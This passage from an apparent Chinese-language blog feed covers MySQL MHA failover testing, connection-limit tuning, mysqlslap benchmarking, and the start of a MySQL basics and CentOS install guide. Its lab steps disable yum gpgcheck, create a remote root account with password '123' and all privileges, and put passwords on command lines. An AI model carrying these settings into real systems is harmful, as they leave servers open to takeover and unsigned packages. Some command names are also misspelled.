libmysqlservices.a<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210234344-593291476.png" alt="image-20220918164004537"></p><p>check ok</p><p><img src="2792175-20220925210234632-908532490.png" alt="image-20220918164822397"></p><h2 id="6-启动MHA进程，查看日志；若集群内的主机挂掉后，需要再次执行开始MHA进程"><a href="#6-启动MHA进程，查看日志；若集群内的主机挂掉后，需要再次执行开始MHA进程" class="headerlink" title="6.启动MHA进程，查看日志；若集群内的主机挂掉后，需要再次执行开始MHA进程"></a>6.启动MHA进程，查看日志；若集群内的主机挂掉后，需要再次执行开始MHA进程</h2><p>管理节点上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">masterha_manager --conf=/root/mastermha/app1.cnf --remove_dead_master_conf --ingore_last_failover<br><br><span class="hljs-comment">##挂在后台执行，生产中执行</span><br><span class="hljs-built_in">nohup</span> masterha_manager --conf=/root/mastermha/app1.cnf --remove_dead_master_conf --ingore_last_failover<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210234904-512454602.png" alt="image-20220918165528890"></p><p>查看master的general_log，发现是有健康检查的条目的，只检查MASTER节点健康</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[hellodb]&gt;show variables like <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><br><span class="hljs-built_in">tail</span> -f /data/mysql/rocky.log <br><span class="hljs-built_in">tail</span> -f /data/mysql/master.log <br><span class="hljs-built_in">tail</span> -f /data/mysql/slave1.<span class="hljs-built_in">log</span> <br>2022-09-18T08:56:24.776722Z  205 QuerySELECT 1 As Value<br>2022-09-18T08:56:25.777208Z  205 QuerySELECT 1 As Value<br>2022-09-18T08:56:26.777319Z  205 QuerySELECT 1 As Value<br><br><span class="hljs-built_in">tail</span> -f /data/mastermha/app1/manager.log<br>ping select until mysql doesn<span class="hljs-string">&#x27;t respond; ##健康检查，只有MASTER节点会有健康检查，所以SLAVE1和SLAVE2都不会有</span><br><span class="hljs-string"></span><br><span class="hljs-string">[16:53:19 root@proxy ~]#tail -f /data/mastermha/app1/manager.log</span><br><span class="hljs-string">Checking the Status of the script.. OK </span><br><span class="hljs-string">SIOCSIFADDR: No such device</span><br><span class="hljs-string">eth0:1: ERROR while getting interface flags: No such device</span><br><span class="hljs-string">SIOCSIFNETMASK: No such device</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [info]  OK.</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [warning] shutdown_script is not defined.</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [info] Set master ping interval 1 seconds.</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [info] Starting ping health check on 10.0.0.132(10.0.0.132:3306)..</span><br><span class="hljs-string">Sun Sep 18 16:55:27 2022 - [info] Ping(SELECT) succeeded, waiting until MySQL doesn&#x27;</span>t respond..<br></code></pre></td></tr></table></figure><h2 id="7-测试MHA的功能，模拟主节点down机"><a href="#7-测试MHA的功能，模拟主节点down机" class="headerlink" title="7.测试MHA的功能，模拟主节点down机"></a>7.测试MHA的功能，模拟主节点down机</h2><p>MHA进程为一次性的，加入down掉了，就要重新启动MHA进程</p><p>在主节点上执行存储过程，会自动同步到从节点。</p><p>之前在app1.cnf上面配置了candidate_master=1，现在128替换132称为主节点了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">call</span> sp_testlog;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><br>##停止MySQL服务<br>systemctl stop mysqld<br><br>##生成了一个manager.log的报告，fail的报告<br>tail <span class="hljs-operator">-</span>f <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mastermha<span class="hljs-operator">/</span>app1<span class="hljs-operator">/</span>manager.log<br><span class="hljs-comment">----- Failover Report -----</span><br><br>app1: MySQL Master failover <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span> succeeded<br>Master <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span> <span class="hljs-keyword">is</span> down<span class="hljs-operator">!</span><br><span class="hljs-keyword">Check</span> MHA Manager logs <span class="hljs-keyword">at</span> proxy:<span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mastermha<span class="hljs-operator">/</span>app1<span class="hljs-operator">/</span>manager.log <span class="hljs-keyword">for</span> details.<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210235220-1400948566.png" alt="image-20220918172117931"></p><p>查看10.0.0.128的状态，已经切换到主了，检查数据同步的多少</p><p>如果在MASTER节点挂掉的情况下，you新写入的数据，则需要全库导出导入，备份恢复一下再加入到MySQL集群</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs sql">##从节点状态没了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.00</span> sec)<br><br>##在UP的从节点查看，已经切换成<span class="hljs-number">128</span>了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: Waiting <span class="hljs-keyword">for</span> source <span class="hljs-keyword">to</span> send event<br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000013</span><br>          Read_Master_Log_Pos: <span class="hljs-number">35534754</span><br>               Relay_Log_File: slave1<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000002</span><br>                Relay_Log_Pos: <span class="hljs-number">326</span><br>        Relay_Master_Log_File: slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000013</span><br>             Slave_IO_Running: Yes<br>            Slave_SQL_Running: Yes<br>            <br>##查看执行的存储过程一致性，count基本一致<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">115030</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br>##新主节点查看进程，来自<span class="hljs-number">129</span>的从节点<br><span class="hljs-operator">|</span> <span class="hljs-number">111</span> <span class="hljs-operator">|</span> sync            <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.129</span>:<span class="hljs-number">45244</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> Binlog Dump <span class="hljs-operator">|</span>  <span class="hljs-number">1413</span> <span class="hljs-operator">|</span> Source has sent <span class="hljs-keyword">all</span> binlog <span class="hljs-keyword">to</span> replica; waiting <span class="hljs-keyword">for</span> more updates <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><br>##没改动，没更新的数据的情况下，可以直接change master;<br>[hellodb]<span class="hljs-operator">&gt;</span>flush logs;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-----------------------------------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set                             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-----------------------------------------------+</span><br><span class="hljs-operator">|</span> slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000014</span> <span class="hljs-operator">|</span>      <span class="hljs-number">197</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span> <span class="hljs-number">5</span>aa76b1b<span class="hljs-number">-1</span>b77<span class="hljs-number">-11</span>ed<span class="hljs-number">-9219</span><span class="hljs-number">-000</span>c29333d85:<span class="hljs-number">1</span><span class="hljs-number">-115049</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-----------------------------------------------+</span><br><br>##修改主节点<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.128&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave-bin.000014&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">197</span>;<br><br><span class="hljs-keyword">start</span> slave;<br><br>##节点状态是OK的<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: Waiting <span class="hljs-keyword">for</span> source <span class="hljs-keyword">to</span> send event<br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000014</span><br>          Read_Master_Log_Pos: <span class="hljs-number">197</span><br>               Relay_Log_File: rocky<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000002</span><br>                Relay_Log_Pos: <span class="hljs-number">326</span><br>        Relay_Master_Log_File: slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000014</span><br>             Slave_IO_Running: Yes<br>            Slave_SQL_Running: Yes<br></code></pre></td></tr></table></figure><h1 id="TIDB：分布式的数据库"><a href="#TIDB：分布式的数据库" class="headerlink" title="TIDB：分布式的数据库"></a>TIDB：分布式的数据库</h1><p>分布式表</p><h1 id="MySQL的最大连接数：show-variables-like-‘-connection-’"><a href="#MySQL的最大连接数：show-variables-like-‘-connection-’" class="headerlink" title="MySQL的最大连接数：show variables like ‘%connection%’"></a>MySQL的最大连接数：show variables like ‘%connection%’</h1><p>最大并发连接数：151个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs none">[(none)]&gt;show variables like &#x27;%connection%&#x27;;<br>+-----------------------------------+----------------------+<br>| Variable_name                     | Value                |<br>+-----------------------------------+----------------------+<br>| character_set_connection          | utf8mb4              |<br>| collation_connection              | utf8mb4_0900_ai_ci   |<br>| connection_memory_chunk_size      | 8912                 |<br>| connection_memory_limit           | 18446744073709551615 |<br>| global_connection_memory_limit    | 18446744073709551615 |<br>| global_connection_memory_tracking | OFF                  |<br>| max_connections                   | 151                  |<br>| max_user_connections              | 0                    |<br>| mysqlx_max_connections            | 100                  |<br>+-----------------------------------+----------------------+<br></code></pre></td></tr></table></figure><h1 id="mysqlslap：MySQL压测工具"><a href="#mysqlslap：MySQL压测工具" class="headerlink" title="mysqlslap：MySQL压测工具"></a>mysqlslap：MySQL压测工具</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">测试用例：查看在<span class="hljs-number">1000</span>并发的情况下，<br>mysqlslap <span class="hljs-operator">-</span>a <span class="hljs-operator">-</span>c <span class="hljs-number">1000</span><br><br>[root<span class="hljs-variable">@rocky</span> <span class="hljs-operator">~</span>]#mysqlslap <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 <span class="hljs-operator">-</span>a <span class="hljs-operator">-</span>c <span class="hljs-number">1000</span><br>mysqlslap: [Warning] <span class="hljs-keyword">Using</span> a password <span class="hljs-keyword">on</span> the command line interface can be insecure.<br>Benchmark<br>Average number <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">to</span> run <span class="hljs-keyword">all</span> queries: <span class="hljs-number">17.270</span> seconds<br>Minimum number <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">to</span> run <span class="hljs-keyword">all</span> queries: <span class="hljs-number">17.270</span> seconds<br>Maximum number <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">to</span> run <span class="hljs-keyword">all</span> queries: <span class="hljs-number">17.270</span> seconds<br>Number <span class="hljs-keyword">of</span> clients <span class="hljs-keyword">running</span> queries: <span class="hljs-number">1000</span><br>Average number <span class="hljs-keyword">of</span> queries <span class="hljs-keyword">per</span> client: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>调整MySQL的最大并发连接数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> max_connections<span class="hljs-operator">=</span><span class="hljs-number">5000</span>;<br><br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>max_connections<span class="hljs-operator">=</span><span class="hljs-number">5000</span><br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> max_connections<span class="hljs-operator">=</span><span class="hljs-number">5000</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> databases;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> Database           <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> catyer             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> hellodb            <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> information_schema <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql              <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysqlslap          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> performance_schema <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sys                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> trigger_pra        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wordpress          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> zabbix             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-number">10</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.02</span> sec)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux MySQL</title>
    <link href="/2023/07/28/linux-MySQL/"/>
    <url>/2023/07/28/linux-MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><img src="2792175-20220828181320816-1246127538.png" alt="image-20220806103220975"></p><p>开源的MySQL</p><p>库表结构：增删改查</p><p>数据类型：</p><p>1.结构化：表格数据，字段，固定格式</p><p>2.非结构化：图片，视频文件</p><p>3.半结构化：HTML，XML等，JSON格式的数据—&gt;其实就是一种数据的格式</p><p>用户—&gt;DBMS—&gt;数据库，使用DBMS显示数据结构化的形式，可控制权限，DBMS管理工具</p><p>java应用程序—调用MySQL内的数据—显示到web页面上</p><h1 id="常见数据库产品"><a href="#常见数据库产品" class="headerlink" title="常见数据库产品"></a>常见数据库产品</h1><p>关系型：MySQL，postgresql(一些软件常见，只支持postgresql)，ORACLE(商业化的关系型数据库)，SQL server(微软商业版数据库)</p><p>非关系型：Mongo DB文档数据库</p><p>缓存数据库：redis，键值key-value</p><p>搜索引擎数据库：elasticsearch</p><p><img src="2792175-20220828181321675-142645545.png" alt="image-20220806105850314"></p><h2 id="常见数据库属性"><a href="#常见数据库属性" class="headerlink" title="常见数据库属性"></a>常见数据库属性</h2><p>行row：表中的每一行，称为记录record，一条记录里面，(姓名：XXX，年龄25，性别男，学号123)</p><p>列column：表中的每一列，称为字段，属性(数据的属性：比如姓名，年龄，性别，学号等)，域也可以，awk就是输出域信息(列信息)</p><h3 id="主键primary-key"><a href="#主键primary-key" class="headerlink" title="主键primary key"></a>主键primary key</h3><p>一般是一个或者是多个字段的集合，主键内的内容必须是唯一的，不能有重复字样出现(不能出现两个张三+年龄等)，一般为多张表的一致的属性，多张表的主要关系</p><p>类似学生基本信息+家长+学习成绩，唯一的关系字段就是学生姓名/年龄等，<em><strong>主键字段不能为空NULL</strong></em></p><p>作用在多列上：复合主键，ID/姓名等可以作为主键</p><h3 id="唯一键-unique-key"><a href="#唯一键-unique-key" class="headerlink" title="唯一键(unique key)"></a>唯一键(unique key)</h3><p>作用在某一个字段，字段内的数值只能唯一，不能重复，比如年龄age字段，age必须唯一，age就是unique key，唯一键可以有多个</p><p>域domain：数据的取值范围，数据的合法性，比如age年龄为0-100岁，sex只能为男/女等</p><h3 id="外键-foreign-key-：1对N的关系"><a href="#外键-foreign-key-：1对N的关系" class="headerlink" title="外键(foreign key)：1对N的关系"></a>外键(foreign key)：1对N的关系</h3><p>一个表的一个字段依赖于另一个表的字段，称为外键，可以设置这个为外键，两个表之间存在依赖关系，B表必须有主键或者是唯一键(UK)，一对多的关系</p><p><img src="2792175-20220828181336310-73625099.png" alt="image-20220806121130233"></p><h3 id="N对N的关系：主键-外键关系"><a href="#N对N的关系：主键-外键关系" class="headerlink" title="N对N的关系：主键+外键关系"></a>N对N的关系：主键+外键关系</h3><p>优点：表与表之间的逻辑关系比较清晰</p><p>缺点：查询比较麻烦，需要组合查询才能查到</p><p><img src="2792175-20220828181336626-1471110979.png" alt="image-20220806121753870"></p><h1 id="MySQL的范式"><a href="#MySQL的范式" class="headerlink" title="MySQL的范式"></a>MySQL的范式</h1><p>sql表的规范</p><p>第一范式1NF：同一列中不能有多个值，即不能出现tom,jerry这样的字符，同时同一个属性不能有多个字段，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs none">editor book        <br>user01 k8s<br>user01 linux<br>user02 python<br></code></pre></td></tr></table></figure><p>不能是这样，k8s和linux同属于这个范式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">editor book1 book2        <br>user01 k8s   linux<br>user02 python<br></code></pre></td></tr></table></figure><p>第二范式：属性完全依赖于主键，主键需要独立</p><p>复合主键：必须依赖于多个列，多个字段</p><h1 id="yum安装MySQL—-gt-前提：一定要连公网，读取yum源"><a href="#yum安装MySQL—-gt-前提：一定要连公网，读取yum源" class="headerlink" title="yum安装MySQL—&gt;前提：一定要连公网，读取yum源"></a>yum安装MySQL—&gt;前提：一定要连公网，读取yum源</h1><h2 id="1-安装Cent-OS-8版本mysql-8-0"><a href="#1-安装Cent-OS-8版本mysql-8-0" class="headerlink" title="1.安装Cent OS 8版本mysql 8.0"></a>1.安装Cent OS 8版本mysql 8.0</h2><p>1.机器上已经自带mysql8.0，新的Yum源安装mysql的时候会检查yum源的正确性，关闭gpgcheck</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">sed -i &#x27;s/gpgcheck=1/gpgcheck=0/g&#x27; base.repo<br></code></pre></td></tr></table></figure><p>2.安装mysql-server，默认8.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install mysql-server<br>systemctl <span class="hljs-built_in">enable</span> --now mysqld<br><br><span class="hljs-comment">##MySQL初始化，可能需要输入temporary pass</span><br>mysql_insure_installation<br><span class="hljs-built_in">cat</span> /var/log/mysql/mysqld.log | grep temporary<br></code></pre></td></tr></table></figure><p>3.进入到mysql，创建一个远程授权用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##创建一个授权用户</span><br>use mysql<br>mysql&gt; CREATE USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, 0 rows affected (0.04 sec)<br><br>mysql&gt; grant all privileges on *.* to <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.03 sec)<br><br>flush privileges;<br></code></pre></td></tr></table></figure><p>4.navicat连接验证</p><h2 id="2-Cent-OS-7安装mysql-8-0"><a href="#2-Cent-OS-7安装mysql-8-0" class="headerlink" title="2.Cent OS 7安装mysql 8.0"></a>2.Cent OS 7安装mysql 8.0</h2><p>1.去到MySQL对应的yum仓库地址，下载你对应发行版版本的仓库</p><p><img src="2792175-20220828181322091-1571261633.png" alt="image-20220806165809806"></p><p>2.下好后安装mysql源，自动在机器上安装yum源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 